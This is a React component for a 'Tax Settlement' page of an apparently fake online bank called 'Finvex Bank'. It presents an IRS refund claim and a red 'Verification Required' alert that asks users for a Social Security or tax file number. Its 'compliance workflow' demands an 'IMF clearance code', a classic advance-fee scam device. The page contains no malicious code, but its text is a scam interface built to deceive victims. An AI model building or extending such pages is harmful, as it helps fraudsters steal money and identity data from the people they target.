import React from 'react';
import { FileText, AlertTriangle, ArrowRight, ShieldCheck, Info } from 'lucide-react';
import MainLayout from '../components/MainLayout';
import { useAppContext } from '../AppContext';

const IRS = () => {
    const { user } = useAppContext();
    if (!user) return null;

    return (
        <MainLayout>
            <div className="dashboard-body" style={{ display: 'block', maxWidth: '800px', margin: '0 auto', padding: 'clamp(16px, 4vw, 32px)' }}>
                <div style={{ marginBottom: '32px' }}>
                    <h1 style={{ fontSize: '28px', fontWeight: 800, color: '#1E293B' }}>Tax Settlement</h1>
                    <p style={{ color: '#64748B', fontSize: '14px', marginTop: '4px' }}>Real-time IRS refund tracking and automated reconciliation.</p>
                </div>

                <div style={{ display: 'flex', gap: '24px', flexDirection: 'column' }}>
                    {/* Hero Box */}
                    <div className="flex-row-mobile" style={{ 
                        padding: 'clamp(24px, 5vw, 40px)', 
                        background: 'linear-gradient(135deg, #0EA5E9, #075985)', 
                        borderRadius: '24px',
                        color: 'white', 
                        display: 'flex', 
                        alignItems: 'center', 
                        gap: '24px',
                        boxShadow: '0 10px 30px rgba(14, 165, 233, 0.2)'
                    }}>
                        <div style={{ padding: '20px', background: 'rgba(255,255,255,0.15)', borderRadius: '50%', backdropFilter: 'blur(10px)', flexShrink: 0 }}>
                            <FileText size={48} color="white" />
                        </div>
                        <div>
                            <h2 style={{ fontSize: '24px', fontWeight: 800, marginBottom: '8px' }}>Claim Your IRS Refund</h2>
                            <p style={{ opacity: 0.9, lineHeight: 1.6, fontSize: '15px' }}>
                                Finvex Bank institutional gateway allows for direct reconciliation of tax refunds from global authorities straight into your liquidity balance.
                            </p>
                        </div>
                    </div>

                    {/* Status Alert */}
                    <div style={{ display: 'flex', alignItems: 'flex-start', gap: '16px', padding: '24px', background: '#FEF2F2', border: '1px solid #FEE2E2', borderRadius: '20px', color: '#991B1B' }}>
                        <AlertTriangle size={24} style={{ flexShrink: 0, marginTop: '2px' }} />
                        <div>
                            <h4 style={{ fontWeight: 800, fontSize: '16px', marginBottom: '4px' }}>Verification Required: Tax ID</h4>
                            <p style={{ fontSize: '14px', lineHeight: 1.6, color: '#B91C1C' }}>
                                Automated records fetch failed. To proceed with the reconciliation, please provide a valid Tax File Number (TFN) or Social Security Identification.
                            </p>
                            <button style={{ marginTop: '20px', padding: '12px 24px', background: '#DC2626', color: 'white', border: 'none', borderRadius: '10px', fontWeight: 700, fontSize: '14px', cursor: 'pointer', boxShadow: '0 4px 12px rgba(220, 38, 38, 0.2)' }}>
                                Link Tax Identification
                            </button>
                        </div>
                    </div>

                    {/* Security Process Card */}
                    <div style={{ padding: 'clamp(24px, 4vw, 32px)', background: 'white', border: '1px solid #E2E8F0', borderRadius: '24px', boxShadow: '0 4px 20px rgba(0,0,0,0.03)' }}>
                        <h3 style={{ fontSize: '18px', fontWeight: 800, color: '#1E293B', marginBottom: '32px', display: 'flex', alignItems: 'center', gap: '10px' }}>
                            <ShieldCheck size={22} color="#0EA5E9" /> Institutional Compliance Workflow
                        </h3>
                        
                        <div style={{ display: 'flex', flexDirection: 'column', gap: '28px' }}>
                            <ProcessStep 
                                number="1" 
                                title="Identity Reconciliation" 
                                desc="We synchronize your Finvex encryption keys with the respective tax jurisdiction databases." 
                            />
                            <ProcessStep 
                                number="2" 
                                title="IMF Protocol Validation" 
                                desc="A valid International Monetary Fund (IMF) clearance code is required for cross-border tax injections." 
                            />
                            <ProcessStep 
                                number="3" 
                                title="Settlement & Liquidity" 
                                desc={`Refunds are processed in realtime and credited to your primary EUR balance.`} 
                            />
                        </div>

                        <div style={{ marginTop: '40px', padding: '20px', background: '#F8FAFC', borderRadius: '16px', display: 'flex', gap: '12px', border: '1px solid #F1F5F9' }}>
                            <Info size={20} color="#64748B" style={{flexShrink:0}} />
                            <p style={{fontSize: '13px', color: '#64748B', lineHeight: 1.5, fontWeight: 500}}>
                                Refund processing typically takes 3-5 business days once all regulatory codes are validated by our compliance audit team.
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            <style>{`
                @media (max-width: 640px) {
                    .flex-row-mobile { flex-direction: column; text-align: center; }
                }
            `}</style>
        </MainLayout>
    );
};

const ProcessStep = ({ number, title, desc }) => (
    <div style={{ display: 'flex', gap: '20px' }}>
        <div style={{ width: '36px', height: '36px', borderRadius: '12px', background: '#F0F9FF', color: '#0EA5E9', display: 'flex', justifyContent: 'center', alignItems: 'center', flexShrink: 0, fontWeight: 800, fontSize: '16px', border: '1px solid #B9E6FE' }}>
            {number}
        </div>
        <div>
            <h4 style={{ fontWeight: 800, fontSize: '15px', color: '#1E293B', marginBottom: '4px' }}>{title}</h4>
            <p style={{ fontSize: '14px', color: '#64748B', lineHeight: 1.5, fontWeight: 500 }}>{desc}</p>
        </div>
    </div>
);

export default IRS;
